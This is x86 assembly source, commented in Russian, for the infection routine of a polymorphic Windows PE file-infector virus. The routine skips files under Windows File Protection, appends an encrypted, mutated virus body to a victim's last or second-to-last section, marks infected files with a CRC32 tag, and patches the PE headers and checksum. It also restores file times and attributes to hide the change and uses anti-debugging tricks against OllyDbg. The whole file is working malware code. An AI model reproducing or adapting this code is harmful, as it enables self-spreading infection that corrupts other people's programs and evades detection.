;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											infect														 ;
;																										 ;
;											Infect														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция Infect
;инфект ре-файла методом расширения последней секции 
;ВХОД ( Infect(char *pszFileName,WIN32_FIND_DATA *wfd) ):
;pszFileName - полный путь к жертве
;wfd         - адрес заполненной структуры WIN32_FIND_DATA 
;ВЫХОД:
;EAX - 0, если заинфектить не получилось, и 1, если заинфектили (отлично) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

;========================================================================================================
xIMAGE_DLLCHARACTERISTICS_NO_SEH	equ	400h 
IMAGE_DLLCHARACTERISTICS_NX_COMPAT	equ	100h 

NBFH				equ		25 					;num_bytes_for_hash количество байтиков, которые будем хэшировать для создания метки  

infect_file			equ		dword ptr [ebp+24h]	;полный путь к жертве
wfd_addr			equ		dword ptr [ebp+28h]	;адрес переданной заполненной структуры WIN32_FIND_DATA 

map_addr			equ		dword ptr [ebp-12]	;база мэпинга файла 
align_newvirsize	equ		dword ptr [ebp-16]	;новый выровненный на FileAlign размер вируса (уеп+декриптор+тело)    
true_newsize		equ		dword ptr [ebp-20]	;новый выровненный на FileAlign размер жертвы (уже с учетом размера вируса)  
flag_infect			equ		dword ptr [ebp-24]	;заинфектили жертву? (0 нет, 1 да) 
morphgen_addr		equ		dword ptr [ebp-28]	;адрес структуры MORPHGEN (для полиморфа)  
uepgen_addr			equ		dword ptr [ebp-32]	;адрес структуры UEPGEN (для уеп-движка)   
delta_infect		equ		dword ptr [ebp-36]	;здесь сохраним дельта-смещение 
last_sec			equ		dword ptr [ebp-44]	;указатель в табличке секций на элемент, соответствующий последней секции
start_code			equ		dword ptr [ebp-48]	;физический адрес оригинальной точки входа
end_code			equ		dword ptr [ebp-52]	;адрес в районе конца той секции, в которой находится точка входа  
prev_sec			equ		dword ptr [ebp-56]	;указатель в табличке секций на элемент, соответствующий пред-последней секции
iIMNTh				equ		dword ptr [ebp-60]	;IMAGE_NT_HEADERS    
code_sec			equ		dword ptr [ebp-64]	;указатель в табличке секций на элемент, соответствующий секции, в которой находится точка входа (по дефолту кодовая секция) 
;======================================================================================================== 


  
Infect:
	pushad										;сохраним регистры 
	mov		ebp,esp										
	mov		ebx,wfd_addr 
	assume	ebx:ptr WIN32_FIND_DATA				;EBX - адрес WIN32_FIND_DATA 
	sub		esp,(sizeof MORPHGEN + 4 + 68)		;выделим в стэке место под структуру MORPHGEN    
	mov		eax,[ebx].nFileSizeLow
	mov		true_newsize,eax					;здесь пока сохраним оргинальный (исходный) размер жертвы 
	and		flag_infect,0						;обнулим флаг 
	and		prev_sec,0  
	mov		morphgen_addr,esp					;сохраним в стэке также и адрес структуры MORPHGEN 
	sub		esp,(sizeof UEPGEN+4)				;место под UEPGEN 
	mov		uepgen_addr,esp						;сохраним адрес 
;--------------------------------------------------------------------------------------------------------
    sub		esp,(MAX_PATH+MAX_PATH+4)			;здесь будем хранить unicode-строку
    mov		esi,esp 
;######################################################################################################## 
    int		3h									;антиотладочный прием       
    ret
    pushfd										;после обработчика выполнение начнется с этой команды. Но тут тоже фича: видимо, это баг Ольки, 
    pop		eax									;после возврата из сех-обработчика Олька забывает обнулить флаг TF - а мы этим и воспользуемся :)!  
    test	ah,1
    jne		_nxtinf02_							;если OllyDbg мы поймали за жопу, то передадим управление в гаМно      
;######################################################################################################## 
	push	infect_file							
	call	xstrlen
	shl		eax,1                                 
	add		eax,4
 
	push	eax
	push	esi
	push	-1
	push	infect_file
	push	0
	push	0
	call	xMultiByteToWideChar1				;переводим ansi-unicode строку   

	pushsz	'sfc'   
_nxtload_:										;здесь узнаем, защищен ли данный файл WFP (SFC)  
	call	xLoadLibraryA1						;загружаем длл
	xchg	eax,ecx      
	push	1900F52h							;SfcIsFileProtected   
	push	ecx 
	call	xGetProcAddress
	mov		edx,ecx								;далее проверим полученный адрес, если он лежит в дипазоне табличке   
	assume	ecx:ptr IMAGE_DOS_HEADER			;экспорта только что загруженно длл, то тогда это форвардинг. Данный адрес 
	add		ecx,[ecx].e_lfanew					;указывает на строку вида имя_длл.имя_функции (в той длл под тем именем и находится нужная нам функа) 
	assume	ecx:ptr IMAGE_NT_HEADERS			;но имя одно и тоже, а имя другой длл известно. Поэтому, если это форвардинг, то загрузим еще и другую длл.  
	add		edx,[ecx].OptionalHeader.DataDirectory[0*8].VirtualAddress
	cmp		eax,edx
	jb		_sfcok_
	add		edx,[ecx].OptionalHeader.DataDirectory[0*8].isize 
	cmp		eax,edx
	ja		_sfcok_ 
	pushsz	'sfc_os' 
	jmp		_nxtload_
_sfcok_: 
    push	esi
    push	0
    call	eax
    add		esp,(MAX_PATH+MAX_PATH+4)			;скорректируем стэк         
    test	eax,eax  
    jne		_error01_							;если файл0 защищен, то на выход    
;-------------------------------------------------------------------------------------------------------- 
	call	GetDelta							;получим дельта-смещение 
	mov		delta_infect,eax					;сохраним его   
;--------------------------------------------------------------------------------------------------------    
	push	FILE_ATTRIBUTE_NORMAL  
	push	infect_file 
	call	xSetFileAttributesA1				;для начала изменим атрибуты файла   
	         
	call	xOpenFile							;откроем файл на чтение+запись  

	inc		eax
	je		_error01_							;неудачно?
	dec		eax 

	mov		ecx,1000h							;иначе возьмем максимальный размер вируса и выровняем его на максимальное значение (SectionAlignment)   
	dec		ecx
	mov		edx,VIRUS_SIZE+MAX_FINE_SIZE 
	add		edx,ecx
	not		ecx
	and		edx,ecx
	add		edx,[ebx].nFileSizeLow				;и прибавим полученный размер к исходному размеру жертвы    

	push	eax   

	push	edi 
	push	edx 	
	push	edi
	push	PAGE_READWRITE
	push	edi 
	push	eax
	call	xCreateFileMappingA1				;создадим проекцию файла с новым размером (потом его обрежем до действительно записанного) 
 												 
	test	eax,eax								;неудачно? 
	jne		_nxtinf01_
	
	call	xCloseHandle1						;в таком случае закроем открытые хэндлы и перепрыгнем дальше 
	jmp		_error01_	 

_nxtinf01_:  
	push	eax 

	push	edi 
	push	edi 
	push	edi 
	push	FILE_MAP_ALL_ACCESS
	push	eax
	call	xMapViewOfFile1						;иначе спроецируем жертву в наше адресное пространство (ап)     
    xchg	eax,edi

	call	xCloseHandle1						;закроем ненужные открытые хэндлы  
	call	xCloseHandle1
	test	edi,edi								;проекция удалась? 
	je		_error01_
;-------------------------------------------------------------------------------------------------------- 
_nxtinf02_: 
	mov		map_addr,edi						;сохраним базу мэпинга 
	push	edi 
	call	ValidPE								;проверим файл на валидность 
	test	eax,eax
	je		_error02_ 
	assume	edi:ptr IMAGE_DOS_HEADER
	add		edi,[edi].e_lfanew
	assume	edi:ptr IMAGE_NT_HEADERS
	mov		iIMNTh,edi							;IMAGE_NT_HEADERS  
	movzx	esi,[edi].FileHeader.SizeOfOptionalHeader 
	lea		esi,dword ptr [ esi + edi + (sizeof IMAGE_FILE_HEADER + 4) ] 
	assume	esi:ptr IMAGE_SECTION_HEADER		;перейдем к табличке секций   
	movzx	ecx,[edi].FileHeader.NumberOfSections
	test	ecx,ecx								;имеются ли вообще секции? 
	je		_error02_
	xor		eax,eax
	cdq 
;--------------------------------------------------------------------------------------------------------  
_cycle01_:										;далее начинаем поиск кодовой секции и последней секции (виртуально и физически) 
 	cmp		edx,[esi].VirtualAddress
 	ja		_search_code_section_
 	cmp		eax,[esi].PointerToRawData 
 	ja		_search_code_section_    
 	mov		eax,[esi].PointerToRawData			;возможно, что это и есть последняя секция 
 	mov		edx,map_addr
 	add		edx,[esi].SizeOfRawData
 	lea		edx,[edx+eax-1]
 	mov		end_code,edx						;сохраним адрес конца последней секции (примерно в том месте и будет метка, если файл уже заинфекчен нами)   
 	mov		edx,[esi].VirtualAddress			;а также сохраним новую точку входа (она будет указывать на конец последней секции)      
 	mov		last_sec,esi						;и сохраним адрес на элемент в табличке секций, в котором хранятся атрибуты последней секции в жертве  
;--------------------------------------------------------------------------------------------------------
_search_code_section_:							;здесь происходит поиск секции, в которой и лежит точка входа 
	push	eax 
	mov		eax,[esi].VirtualAddress 
	cmp		eax,[edi].OptionalHeader.AddressOfEntryPoint   
	ja		_nxtsec_
	cmp		[esi].Misc.VirtualSize,0
	jne		_vsok1_
	add		eax,[esi].SizeOfRawData   
	jmp		_psok1_
_vsok1_:
	add		eax,[esi].Misc.VirtualSize
_psok1_:  
	cmp		eax,[edi].OptionalHeader.AddressOfEntryPoint     
	jbe		_nxtsec_
	mov		eax,[edi].OptionalHeader.AddressOfEntryPoint      
	sub		eax,[esi].VirtualAddress
	add		eax,[esi].PointerToRawData 
	add		eax,map_addr    
	mov		start_code,eax						;если нашли эту (кодовую) секцию, то сохраним физический адрес точки входа, т.к. здесь и возьмем определенное кол-во байт для создания метки инфекта 
	mov		code_sec,esi 
_nxtsec_: 
	pop		eax
	add		esi,sizeof IMAGE_SECTION_HEADER
	loop	_cycle01_							;переходим к проверке следующей секции  
;-------------------------------------------------------------------------------------------------------- 
	push	edi   			 					
	mov		edi,end_code						;EDI - адрес в районе конца последней секции (если проверяемый файл0 инфицирован нами, то метка будет лежать где-то там)						
  	mov		esi,last_sec						;ESI - указатель в табличке секций на самый последний элемент      
  	cmp		dword ptr [esi].Name1,'rsr.'		;если последняя секция ресурсов, то мы ее можем свободно (условия) передвинуть, и внедриться в предпоследнюю секцию  
  	;jmp		_notrsrc_ 
  	jne		_notrsrc_
  	lea		edx,dword ptr [esi - sizeof (IMAGE_SECTION_HEADER)] 
  	assume	edx:ptr IMAGE_SECTION_HEADER
  	cmp		[edx].SizeOfRawData,0				;физический размер предпоследней секции != 0 ? 
  	je		_infectlastsec_  
  	mov		ecx,code_sec 
  	assume	ecx:ptr IMAGE_SECTION_HEADER    
  	mov		ecx,[ecx].SizeOfRawData
  	sub		ecx,[edx].SizeOfRawData
  	sub		ecx,(VIRUS_SIZE+VIRUS_SIZE)			;если предпоследняя секция данных, то важно, чтобы ее физический размер был меньше размера кодовой секции, иначе палево      
  	jl		_infectlastsec_
  	mov		prev_sec,edx						;сохраняем указатель на нужный элемент в таличке секций  	
  	mov		edi,map_addr
  	add		edi,[edx].PointerToRawData
  	add		edi,[edx].SizeOfRawData  
  	dec		edi									;и меняем значение в EDI - на "предпоследнюю секцию" 
_1section_: 
_notrsrc_:
_infectlastsec_:	   
;-------------------------------------------------------------------------------------------------------- 	
	xor		eax,eax   							;далее, проверим, заражен ли файл? если заражен, то метка должна находится в конце последней/предпоследней секции 
	std											;метка представляет собой хэш от определенного количества байт, взятых в OEP жертвы и сохраненных в конце последней/предпоследней секции (хэш = 4 байта)  
_search_metka_:									;для начала пропустим нули   
	scasb
	je		_search_metka_
	dec		edi
	dec		edi
	cld   
	push	NBFH								;далее, посчитаем хэш от NBFH байт, взятых в OEP жертвы 
	push	start_code
	call	xCRC32 
	cmp		eax,dword ptr [edi]					;и сравним с байтами (примерно/в области) в конце последней секции 
	pop		edi 
	je		_error02_							;и если хэш совпал с теми 4-мя байтами, то скорее всего файл уже заинфекчен нами :)!  
;--------------------------------------------------------------------------------------------------------  
  	mov		eax,dword ptr [esi].SizeOfRawData	
  	test	eax,eax								;если физический размер последней секции == 0, то на выход 
  	je		_error02_
  	cmp		eax,[esi].Misc.VirtualSize			;если физ. рамер > вирт. размера, то на выход 
  	jb		_error02_ 
;-------------------------------------------------------------------------------------------------------- 
  	lea		edx,[edi].OptionalHeader.AddressOfEntryPoint  
	lea		ecx,OEP
	add		ecx,delta_infect  
	mov		edx,dword ptr [edx]
	add		edx,[edi].OptionalHeader.ImageBase 
	push	edx      
	pop		dword ptr [ecx]						;изменим (временно) переход после отработки зверька на тело жертвы (на ее OEP)  
;--------------------------------------------------------------------------------------------------------  
	push	PAGE_READWRITE 
	push	MEM_RESERVE+MEM_COMMIT 
	push	VIRUS_SIZE+MAX_FINE_SIZE+UEP_RESTBYTES_SIZE  
	push	0
	call	xVirtualAlloc1						;выделим виртуальную память для построения декриптора(ов) с уепом, а также место для временного хранения ранее сохраненных байт жертвы, в которой мы сейчас исполняемся 

	push	eax   

	push	edi
	push	esi 

	xchg	eax,edi 
	mov		ecx,UEP_RESTBYTES_SIZE 
	lea		esi,restore_bytes
	add		esi,delta_infect 
	rep		movsb								;сохраним ранее сохраненный байты жертвы, в которой мы сейчас исполняемся   
;-------------------------------------------------------------------------------------------------------- 
	mov		ecx,uepgen_addr						;ECX - указатель на структуру UEPGEN; заполним данную структуру     
	assume	ecx:ptr UEPGEN
	mov		edx,morphgen_addr					;EDX - указатель на структуру MORPHGEN; заполним данную структуру  
	assume	edx:ptr MORPHGEN
	mov		[edx].pa_buf_for_morph,edi			;сохраним адрес буфера, где будем строить полиморфный декриптор(ы) с зашифрованным кодом     	  
	push	map_addr  	
	pop		[ecx].mapped_addr					;сохраним бау мэппинга 
	lea		eax,RANG32
	add		eax,delta_infect 
	mov		[ecx].rgen_addr,eax					;а также сохраним адрес ГСЧ 
	mov		[edx].rgen_addr,eax 
	lea		eax,xTG
	add		eax,delta_infect   
	mov		[ecx].tgen_addr,eax					;и трэшгена       
	mov		[edx].tgen_addr,eax 
	push	prev_sec							;и передадим адрес (в табличке секций) на элемент той секции (последней/предпоследей), куда внедримся 
	pop		[ecx].xsection 	  
	lea		eax,xStart
	add		eax,delta_infect
	mov		[edx].cryptcode_addr,eax			;и адрес кода (начало нашего зверька), который надо отмутировать (зашифровать и навесить декриптор(ы))  
	mov		[edx].size_cryptcode,VIRUS_SIZE		;размер этого кода
	mov		[edx].mapped_addr,0  				;данное поле (здесь) зарезервировано   

	push	ecx									;кладем в стэк единственный параметр - это адрес структуры UEPGEN 
	call	FLEA								;и вызываем уеп-движок   
	test	eax,eax
	je		_error02_ 

	push	edx									;адрес структуры MORPHGEN    
	call	FINE								;и следом вызываем полиморфный движок
	  
	pop		esi
	pop		edi
	push	edi
	push	esi    
	push	eax									;в EAX - адрес декриптора(ов) 
	push	ecx    								;в ECX - размер декриптора(ов) + зашифрованного зверька  
;-------------------------------------------------------------------------------------------------------- 
  	mov		eax,[esi].SizeOfRawData  
  	mov		edx,[edi].OptionalHeader.FileAlignment
  	add		ecx,4 
  	;add		ecx,(VIRUS_SIZE+VIRUS_SIZE) 
  	dec		edx
  	add		ecx,edx								;выравниваем новый размер зверька на уже известный FileAlign  
  	not		edx
  	and		ecx,edx   		 
  	mov		align_newvirsize,ecx				;и сохраним полученный размер  
  	add		ecx,[ebx].nFileSizeLow				;прибавим к нему исходный размер жертвы            
  	mov		true_newsize,ecx					;и сохраним новый размер жертвы в стэке   
;--------------------------------------------------------------------------------------------------------	
	add		eax,[esi].PointerToRawData 
	sub		eax,[ebx].nFileSizeLow				;у жертвы есть оверлей? 
	jae		_no_overlay_						;если нет, то прыгаем дальше 
	neg		eax									;иначе запишем его   
	lea		edi,dword ptr [ecx-01] 
	add		edi,map_addr
	mov		esi,map_addr
	add		esi,[ebx].nFileSizeLow  
	dec		esi
	xchg	eax,ecx
	std
	rep		movsb
	cld           
;-------------------------------------------------------------------------------------------------------- 
_no_overlay_:                     
	pop		ecx            
	pop		esi

	pop		edx  
	assume	edx:ptr IMAGE_SECTION_HEADER  
	cmp		prev_sec,0							;можно ли внедриться в предпоследнюю секцию?     
	je		_last_section_  
	push	ecx
	;push	align_newvirsize      
	push	edx
	push	map_addr
	call	re_rsrc								;если да, то пересобираем секцию ресурсов
	mov		edx,prev_sec 
	assume	edx:ptr IMAGE_SECTION_HEADER		;и меняем указатель на элемент, соответствующий предпоследней секции    

_last_section_:   
	mov		edi,map_addr						;получим физический адрес конца последней секции
	add		edi,[edx].PointerToRawData
	add		edi,[edx].SizeOfRawData   	   
	push	ecx 
	rep		movsb								;и запишем нашего отмутированного зверя     
	push	NBFH 
	push	start_code
	call	xCRC32
	stosd										;и поставим метку об инфекте (метка для каждой жертвы всегда будет разная)    
	xchg	eax,ecx  
	pop		ecx   
	sub		ecx,align_newvirsize
	neg		ecx
	sub		ecx,4								;корректируем с учетом метки   
	rep		stosb								;обнуляем последние байты (чтобы в жертве просто было найти метку)    
	pop		eax
	mov		esi,dword ptr [esp]           
	mov		ecx,UEP_RESTBYTES_SIZE
	lea		edi,restore_bytes
	add		edi,delta_infect  
	rep		movsb								;теперь запишем в буфер ранее сохраненные оригинальные байты жертвы, в которой мы сейчас работаем  
	xchg	eax,edi
	mov		esi,edx  

	pop		eax 
 
	push	MEM_DECOMMIT
	push	VIRUS_SIZE+MAX_FINE_SIZE  	
	push	eax 		
	call	xVirtualFree1						;освободим ранее выделенную виртуальную память 
;--------------------------------------------------------------------------------------------------------  
	lea		edx,[esi].SizeOfRawData
	lea		eax,[esi].Misc.VirtualSize   
	mov		ecx,align_newvirsize   
	add		dword ptr [edx],ecx					;теперь увеличим физический размер последней секции на ранее сохраненный выровненный новый размер зверька 
	cmp		dword ptr [eax],0
	je		_vs_equ_ps_ 
	add		dword ptr [eax],ecx
	jmp		_correct_rsrc_ 
_vs_equ_ps_:
	push	dword ptr [edx]
	pop		dword ptr [eax] 

_correct_rsrc_:
	mov		edx,[esi].VirtualAddress			;данные предпоследней/последней секции
	add		edx,[esi].Misc.VirtualSize
	or		[esi].Characteristics,80000000h		;добавим атрибуты еще и на запись    
	mov		esi,last_sec						;а вот это точно последняя секция  
	mov		eax,[esi].Misc.VirtualSize 
	test	eax,eax
	jne		_notzerovs_                
	mov		eax,[esi].SizeOfRawData
	jmp		_nxt_correct_    
_notzerovs_: 
	cmp		dword ptr [esi].Name1,'rsr.'      
	jne		_nxt_correct_
	mov		[edi].OptionalHeader.DataDirectory[2*8].isize,eax  

_nxt_correct_:    
   	mov		ecx,[edi].OptionalHeader.SectionAlignment
   	dec		ecx              
   	add		eax,ecx
   	add		edx,ecx     
   	not		ecx
   	and		eax,ecx                                
   	and		edx,ecx   
   	mov		ecx,[esi].VirtualAddress   
   	sub		ecx,edx
   	cmp		prev_sec,0							;проверка, в предпоследнюю секцию мы внедрились?
   	je		_correct_imagesize_   
   	jecxz	_correct_imagesize_					;и правильно ли скорректирован физический размер этой секции?
   	mov		edx,[edi].OptionalHeader.SectionAlignment    
   	mov		ecx,prev_sec
   	assume	ecx:ptr IMAGE_SECTION_HEADER
   	add		[ecx].Misc.VirtualSize,edx			;если нет, то корректируем на SectionAlignment  
_correct_imagesize_:
	lea		edx,[edi].OptionalHeader.SizeOfImage 
	add		eax,[esi].VirtualAddress 
   	mov		dword ptr [edx],eax					;скорректируем SizeOfImage=LastSec.AlignVirtSize+LastSec.VirtAddr 
;########################################################################################################
	pushfd 										;еще один антиотладочный трюк
	pop		eax
	or		ah,1
	push	eax
	popfd										;когда мы взводим в 1 флаг TF, то без отладчика возникнет исключение  	 
	jmp		$+3									;после первой команды, которая находится после popfd (в данном случае исключение будет по 
	db		0B8h								;          
	call	xCloseHandle1						;вот этому адресу (сюда нас перебросит jmp)
	jmp		edx
;########################################################################################################     
;-------------------------------------------------------------------------------------------------------- 
	btr		[edi].OptionalHeader.DllCharacteristics,10	;xIMAGE_DLLCHARACTERISTICS_NO_SEH (обнулим этот флаг, чтобы наш seh-обработчик отработал на отлично) 
	btr		[edi].OptionalHeader.DllCharacteristics,08	;xIMAGE_DLLCHARACTERISTICS_NX_COMPAT (Виста проверяет этот флаг, и если он выставлен, то наш сех не выполнится) 
	and		[edi].OptionalHeader.DataDirectory[10*8].VirtualAddress,0	;также надо обнулить и эти 2 поля  
	and		[edi].OptionalHeader.DataDirectory[10*8].isize,0   
;-------------------------------------------------------------------------------------------------------- 
	pushsz	'Imagehlp'							;здесь проверим поле CheckSum, если оно !=0, то пересчитаем его по-новой и сохраним    
	call	xLoadLibraryA1     
	push	0D8C7E64h							;CheckSumMappedFile  
	push	eax
	call	xGetProcAddress   
	push	esp
	mov		esi,esp
	push	esp 
	mov		edx,esp
	push	edi
	mov		edi,edx 
	push	esi  
	push	edi   			
	push	true_newsize  
	push	map_addr   
	call	eax         
	test	eax,eax  
	je		_csf0_
	cmp		dword ptr [edi],0 
	je		_csf0_
	pop		edi    
	push	dword ptr [esi]                          
	pop		[edi].OptionalHeader.CheckSum    
_csf0_: 	  
	inc		flag_infect							;увеличим флаг ифекта, тем самым покаав, что ифект прошел успешно 
	jmp		_unmap_ 				 
;-------------------------------------------------------------------------------------------------------- 
_error02_: 
	push	[ebx].nFileSizeLow					;сюда прыгнем в случае херни 
	pop		true_newsize 

_unmap_: 
	push	map_addr
	call	xUnmapViewOfFile1					;выгрузим мэпинг файла   

_error01_: 	
	call	xOpenFile							;откроем снова файл для чтения+записи  

   	inc		eax
   	je		_error03_
   	dec		eax

   	xchg	esi,eax
   	lea		eax,[ebx].ftLastWriteTime 
   	push	eax
   	push	edi
   	push	edi								 					 
   	push	esi
   	call	xSetFileTime1						;сохраним ранее полученное время последней модификации файла  

   	push	FILE_BEGIN
   	push	edi
   	push	true_newsize
   	push	esi
   	call	xSetFilePointer1					;обрежем лишний размер у жертвы

   	push	esi
   	call	xSetEndOfFile1						;зафиксируем его     

   	push	esi
   	call	xCloseHandle1

_error03_:    	
   	push	[ebx].dwFileAttributes  
    push	infect_file
    call	xSetFileAttributesA1				;восстановим атрибуты 

    mov		eax,flag_infect						;сохраним флаг инфекта в EAX (0 - херня, 1 - заинфектили :)! 
    mov		dword ptr [ebp+1Ch],eax            
    mov		esp,ebp 
  	 
	popad
	ret		4*2									;на выход!
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции Infect 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функа xOpenFile
;открытие файла на чтение+запись 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xOpenFile:
	xor		edi,edi
	push	edi
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	edi 
	push	FILE_SHARE_READ+FILE_SHARE_WRITE
	push	GENERIC_READ+GENERIC_WRITE
	push	infect_file
	call	xCreateFileA1
	ret  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи xOpenFile 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 






